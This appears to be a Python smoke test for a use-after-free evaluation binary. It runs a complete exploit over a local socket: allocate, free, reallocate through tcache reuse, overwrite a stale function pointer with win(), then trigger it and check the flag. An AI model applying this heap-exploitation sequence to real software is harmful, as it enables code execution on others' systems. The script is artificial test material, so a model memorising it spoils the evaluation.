#!/usr/bin/env python3
"""Smoke test for the UAF eval twins (ports 19996/19997): the exploit
is menu-driven (letters, [f]ree first or last), the exploit MUST take
the tcache-reuse path.

Usage:
  python3 smoke_test.py <port> <win_addr> <flag>

win_addr is the win() address (no-PIE: fixed per binary, extract it
with `objdump -d uaf-eval-001 | grep '<win>:'`). The exploit is
menu-driven (letters, [f]ree first or last), the exploit MUST take
the tcache-reuse path.
"""

import re
import socket
import sys


def recv_until(s, needle, limit=4096):
    data = b""
    while needle not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(data) > limit:
            break
    return data


def main():
    if len(sys.argv) != 4:
        print("usage: smoke_test.py <port> <win_addr> <flag>")
        return 1
    port = int(sys.argv[1])
    win_addr = int(sys.argv[2], 16)
    flag = sys.argv[3]

    s = socket.create_connection(("127.0.0.1", port), timeout=10)
    menu = recv_until(s, b"x]it\n")
    print(f"[+] menu: {menu.decode(errors='replace').strip()}")

    # 1. new: the canvas mounts
    s.send(b"n\n")
    out = recv_until(s, b"new: ")
    assert b"mounted" in out, f"no new echo: {out!r}"
    print("[+] canvas mounted")

    # 2. free: the chunk lands in the tcache, the call is gated now
    s.send(b"f\n")
    out = recv_until(s, b"free: ")
    assert b"tcache" in out, f"no free echo: {out!r}"
    print("[+] freed (tcache holds it; the call is gated)")

    # 3. new again: the tcache hands the SAME chunk back (the reuse)
    s.send(b"n\n")
    out = recv_until(s, b"new: ")
    assert b"mounted" in out, f"no re-mount echo: {out!r}"
    print("[+] re-mounted (tcache reuse)")

    # 4. paint: the exploit writes the win() address (hex text) into
    #    the brush slot - through the stale-turned-live reference
    s.send(b"p\n")
    s.send(f"{win_addr:x}\n".encode())
    out = recv_until(s, b"paint: ")
    print("[+] paint echo: brush <- win")

    # 5. go: the live chunk's brush fires - win() reads the flag
    s.send(b"g\n")
    out = recv_until(s, b"FLAG:")
    print(f"[+] output: {out.decode(errors='replace').strip()}")
    match = re.search(rb"FLAG: (\S+)", out)
    if not match:
        print("[!] FAIL: the FLAG: line is missing")
        return 1
    if match.group(1).decode() != flag:
        print(f"[!] FAIL: the flag is wrong: {match.group(1).decode()}")
        return 1
    print(f"[+] OK: {match.group(1).decode()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
